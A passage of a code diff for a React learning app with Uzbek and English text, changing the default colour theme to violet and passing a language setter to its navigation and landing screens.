         !hasKey()&&React.createElement("div",{style:{marginTop:8,padding:"8px 10px",background:"rgba(255,180,0,0.08)",border:"1px solid rgba(255,180,0,0.25)",borderRadius:8,fontSize:11,color:"var(--c-warn)"}},
           t(lang,"⚠ Profilda AI kalitini o'rnating.","⚠ Set AI key in Profile."))
       ),
@@ -622,7 +713,7 @@ function AIChat({open,onClose,lang}){
 
 // ── App Root ──────────────────────────────────────────────────
 function App(){
-  const [theme,_setTheme]=useState(()=>{try{return localStorage.getItem(THEME_KEY)||"blue";}catch{return"blue";}});
+  const [theme,_setTheme]=useState(()=>{try{return localStorage.getItem(THEME_KEY)||"violet";}catch{return"violet";}});
   const setTheme=v=>{_setTheme(v);try{localStorage.setItem(THEME_KEY,v);}catch{}};
   const [lang,_setLang]=useState(()=>{try{return localStorage.getItem(LANG_KEY)||"uz";}catch{return"uz";}});
   const setLang=v=>{_setLang(v);try{localStorage.setItem(LANG_KEY,v);}catch{}};
@@ -637,8 +728,8 @@ function App(){
   useEffect(()=>{
     const th=theme;
     document.documentElement.setAttribute("data-theme",th);
-    const colors={blue:"#00d4ff",green:"#00ff88",purple:"#c084fc"};
-    const c=colors[th]||colors.blue;
+    const colors={violet:"#a855f7",cyan:"#00d4ff",green:"#00ff88"};
+    const c=colors[th]||colors.violet;
     const r=document.documentElement.style;
     r.setProperty("--accent",c);
     r.setProperty("--accent-glow",`${c}72`);
@@ -648,16 +739,16 @@ function App(){
 
   const user={...progress,completedLessons:progress.completedLessons||[]};
   const routeName=typeof route==="string"?route:route?.name;
-  const navProps={setRoute,user,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};
+  const navProps={setRoute,user,setLang,onOpenProfile:()=>setProfileOpen(true),onOpenAI:()=>setAiOpen(true)};
 
   return React.createElement(LangCtx.Provider,{value:lang},
     React.createElement("div",null,
       routeName!=="landing"&&React.createElement(TopNav,navProps),
-      routeName==="landing"?React.createElement(LandingScreen,{setRoute}):
+      routeName==="landing"?React.createElement(LandingScreen,{setRoute,setLang}):
       routeName==="dashboard"?React.createElement(DashboardScreen,{...navProps}):
       routeName==="section"?React.createElement(SectionScreen,{...navProps,sec:route?.sec||1}):
       routeName==="lesson"?React.createElement(LessonScreen,{...navProps,markComplete,num:route?.num||1}):
-      React.createElement(LandingScreen,{setRoute}),
+      React.createElement(LandingScreen,{setRoute,setLang}),
       profileOpen&&React.createElement(ProfileModal,{user,theme,setTheme,lang,onClose:()=>setProfileOpen(false),onSave:patch=>{updateProgress({name:patch.name});setProfileOpen(false);}}),
       React.createElement(AIChat,{open:aiOpen,onClose:()=>setAiOpen(false),lang})
     )
